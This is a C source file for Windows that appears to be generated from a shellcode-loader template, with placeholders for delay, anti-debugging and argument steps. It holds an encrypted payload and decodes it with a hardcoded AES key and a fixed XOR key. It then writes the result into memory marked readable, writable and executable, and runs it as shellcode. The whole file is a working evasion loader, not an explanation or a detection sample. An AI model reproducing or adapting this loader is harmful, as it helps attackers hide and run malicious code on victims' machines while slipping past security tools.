#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <bcrypt.h>


//####DEFINE####

int aes_decrypt_3e1d2ceeee094098aa114370deb67764(unsigned char* encoded, int length) {

    unsigned char key[] = {0x00,0xff,0x7b,0xb8,0x73,0x32,0x19,0x8b,0x56,0xfe,0x31,0xc4,0x07,0xc1,0xd5,0x77,0x1f,0xa2,0xea,0xab,0xe4,0x29,0x87,0x9d,0x18,0x8c,0x91,0xbf,0x8b,0x02,0xcf,0xdf};
    int key_length = sizeof(key);
    unsigned char iv[] = {0x7a,0x4b,0xff,0x92,0x13,0x40,0x5b,0x25,0xf6,0xe3,0x51,0x8b,0xd4,0x2b,0xb6,0x22};
    int iv_length = sizeof(iv);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbData, dwLength = length;
    PBYTE pbKeyObject = NULL;

    printf("\n[*] Before AES values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed\n");
        return -1;
    }

    // Calculate the size of the buffer to hold the KeyObject
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGetProperty failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        printf("[-] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Generate the key from supplied input key bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, key_length, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Decrypt the data
    status = BCryptDecrypt(hKey, encoded, length, NULL, iv, iv_length, encoded, length, &dwLength, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptDecrypt failed\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Debug statement to print the decrypted values
    printf("\n[*] After AES values: {");
    for (DWORD i = 0; i < dwLength; i++) {
        printf("0x%02x", encoded[i]);
        if (i < dwLength - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return dwLength;
}int xor_encode_eed9995e7d834dc285e4177cd61ef608(unsigned char* data, int data_len)
{
    const char* key = "CKEYt=j;LA9l";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}



DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x1d,0xd0,0xbd,0x76,0x1d,0xa5,0x71,0x6d,0x51,0x19,0x05,0x18,0x20,0xbb,0xcc,0xea,0xfe,0xc2,0xdc,0x94,0xfb,0x3b,0x55,0x24,0x5b,0x2d,0xd1,0x79,0xa1,0x0a,0xa4,0x5e,0x9f,0xfa,0xbe,0xb5,0xe3,0x49,0x64,0x6a,0x44,0x14,0xb0,0x05,0xc2,0xb0,0x24,0xa0,0xdd,0x02,0x72,0x3a,0xf8,0xf3,0x45,0x43,0x1e,0xd9,0xf8,0xd2,0xe1,0x7c,0x90,0xd0,0x76,0xf1,0x3f,0xba,0x70,0xbf,0xb7,0xb2,0x5e,0x9b,0xb9,0x15,0x18,0x9d,0xa8,0x9f,0xb4,0xaf,0xea,0x27,0xd7,0x57,0x4e,0xa2,0xe5,0x87,0x58,0x3e,0xb6,0x72,0xf3,0xf2,0x36,0xe1,0x03,0x72,0x88,0x23,0x78,0x54,0x1a,0x0c,0xa0,0x42,0x5f,0x5d,0x1d,0x9e,0x98,0x0c,0x5f,0x15,0xfa,0x90,0x7d,0x77,0x07,0x3d,0x79,0x67,0xde,0xa5,0xa3,0x47,0x8f,0xd7,0x2a,0xf7,0xb3,0xe0,0x59,0x6a,0x0d,0x2e,0x02,0x9e,0x1b,0x91,0x76,0xe4,0x33,0x45,0x67,0x6b,0x9b,0xe6,0x19,0xc0,0x9a,0x59,0x4d,0xae,0x08,0x64,0x1a,0xef,0x99,0x50,0xea,0x0f,0x93,0x52,0xc4,0xca,0x48,0x7a,0xd6,0xc6,0x8a,0x48,0x14,0xc0,0xb9,0x1b,0x4f,0x3e,0x00,0xf5,0x90,0xa2,0xe5,0x03,0x69,0x2c,0x23,0xab,0x0f,0x3f,0x91,0x2a,0xa3,0x76,0x9e,0x94,0xf9,0x2e,0x3f,0xd5,0x25,0x20,0x98,0x23,0xe8,0x4d,0x05,0xde,0xa0,0xc6,0xe1,0x61,0x96,0xf2,0x16,0x5d,0xed,0xbb,0x4f,0x8a,0x08,0x5c,0x54,0xd6,0x1a,0x67,0xbe,0x80,0xe2,0xd4,0xd8,0x42,0x37,0x6d,0x85,0x44,0x5f,0x42,0x70,0x9d,0xaf,0xda,0xad,0x6f,0xec,0x32,0x6a,0x74,0xfb,0x0d,0xd3,0x2c,0x9e,0x14,0xbb,0xc1,0xb8,0x56,0x69,0xa4,0xc8,0x3a,0x39,0x9c,0xa2,0x25,0x9d,0x68,0x67,0x1f,0xa5,0x0f,0xa7,0x33,0x7d,0x09,0x72,0x1f,0xf1,0x5e,0xce,0x75,0x72,0x53,0x02,0x1f};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = aes_decrypt_3e1d2ceeee094098aa114370deb67764(encoded, length);length = xor_encode_eed9995e7d834dc285e4177cd61ef608(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
